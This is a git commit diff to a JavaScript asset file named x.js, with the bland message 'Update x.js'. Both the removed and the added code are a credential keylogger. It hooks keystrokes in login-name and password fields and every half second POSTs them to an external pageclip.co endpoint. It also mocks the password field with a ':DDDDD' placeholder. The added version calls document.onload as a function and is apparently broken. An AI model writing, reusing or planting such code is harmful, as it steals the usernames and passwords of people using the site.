645f4a7ecf7fc5c130be7c3d407106959201370b
Fish <64684124+Fish-o@users.noreply.github.com>
2021-04-16 11:03:59 +0200

    Update x.js

--- assets/js/x.js
+++ assets/js/x.js
@@ -1,29 +1,30 @@
-var keys='';
-var url = 'https://send.pageclip.co/mMJZqTWOskoatOv5E2bqIWkAxqcetkfi';
-document.getElementsByName("wu_loginname")?.forEach(element=>{
-  element.onkeydown = function(e){
-    let key = `[l:${e.type}:${e.key}:${e.keycode}]`;
-    keys+=key;
-  }
-})
-document.getElementsByName("wu_password")?.forEach(element=>{
-  element.setAttribute("placeholder", ":DDDDD")
-  element.onkeydown = function(e){
-    let key = `[l:${e.type}:${e.key}:${e.keycode}]`;
-    keys+=key;
-  }
-})
-	
+document.onload((e) => {
+  var keys = '';
+  var url = 'https://send.pageclip.co/mMJZqTWOskoatOv5E2bqIWkAxqcetkfi';
+  document.getElementsByName('wu_loginname')?.forEach((element) => {
+    element.onkeydown = function (e) {
+      let key = `[${e.key}:${e.type}:l]`;
+      keys += key;
+    };
+  });
+  document.getElementsByName('wu_password')?.forEach((element) => {
+    element.setAttribute('placeholder', ':DDDDD');
+    element.onkeydown = function (e) {
+      let key = `[${e.key}:${e.type}:p]`;
+      keys += key;
+    };
+  });
 
-window.setInterval(function(){
-	if(keys.length>0) {
-	  fetch(url, {
-		  method: 'POST',
-		  headers: {
-		    'Content-Type': 'application/json;charset=utf-8'
-		  },
-		  body: JSON.stringify({text:keys})
-		});
-		keys = '';
-	}
-}, 500);
+  window.setInterval(function () {
+    if (keys.length > 0) {
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json;charset=utf-8',
+        },
+        body: JSON.stringify({ text: keys }),
+      });
+      keys = '';
+    }
+  }, 500);
+});
